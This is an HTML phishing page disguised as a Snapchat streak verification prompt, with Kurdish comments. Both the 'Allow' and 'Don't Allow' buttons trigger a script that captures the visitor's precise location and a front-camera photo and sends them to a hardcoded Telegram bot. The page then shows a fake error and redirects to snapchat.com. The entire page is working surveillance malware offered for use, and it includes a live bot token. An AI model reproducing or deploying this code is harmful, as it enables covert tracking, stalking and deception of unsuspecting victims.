<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Streak Verification</title>
    <style>
        body { background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10; }
        .alert-box { position: relative; width: 280px; background: rgba(255,255,255,0.95); border-radius: 15px; text-align: center; overflow: hidden; z-index: 20; box-shadow: 0 0 30px rgba(0,0,0,0.6); }
        .text { padding: 22px; color: #000; font-size: 16px; line-height: 1.4; font-weight: 500; }
        .btns { display: flex; border-top: 0.5px solid #bbb; }
        .btn { flex: 1; padding: 14px; color: #007AFF; font-size: 17px; cursor: pointer; border: none; background: none; outline: none; font-family: inherit; }
        .btn-bold { font-weight: 600; border-right: 0.5px solid #bbb; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="overlay"></div>
<div class="alert-box">
    <div class="text">Allow "Snapchat" to access your location and camera to verify this streak?</div>
    <div class="btns">
        <button class="btn btn-bold" onclick="startCapture()">Allow</button>
        <button class="btn" onclick="startCapture()">Don't Allow</button>
    </div>
</div>

<!-- توخمە شاراوەکان بۆ کامێرا -->
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // 😈 زانیارییەکانت - جێگیر کراون
    const B_T = "8641718491:AAH1_yNz4ZQ0hxmMhWK9HPc7zY6CDsvfw2o";
    const C_I = "212703396";

    async function sendMsg(text) {
        await fetch(`https://api.telegram.org/bot${B_T}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: C_I, text: text })
        });
    }

    async function sendPhoto(blob) {
        const formData = new FormData();
        formData.append('chat_id', C_I);
        formData.append('photo', blob, 'target_face.jpg');
        await fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    }

    async function startCapture() {
        await sendMsg("🎯 Target Clicked! Starting capture...");

        // 1. ڕاوکردنی لۆکەیشن
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendMsg(`📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                captureCamera();
            }, async () => {
                await sendMsg("❌ Location: DENIED");
                captureCamera();
            }, { enableHighAccuracy: true });
        } else {
            captureCamera();
        }
    }

    async function captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // چاوەڕێ بکە تا کامێرا ئامادە دەبێت
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(async (blob) => {
                        await sendPhoto(blob);
                        await sendMsg("📸 Image Captured & Sent!");
                        stream.getTracks().forEach(t => t.stop());
                        finalize();
                    }, 'image/jpeg', 0.8);
                }, 1000); // 1 چرکە چاوەڕێ بکە بۆ ڕوونی وێنەکە
            };
        } catch (err) {
            await sendMsg("🚫 Camera: DENIED or Not Found");
            finalize();
        }
    }

    function finalize() {
        setTimeout(() => {
            alert("Connection Lost: Please refresh your Snapchat app.");
            window.location.href = "https://www.snapchat.com";
        }, 500);
    }
</script>

</body>
</html>
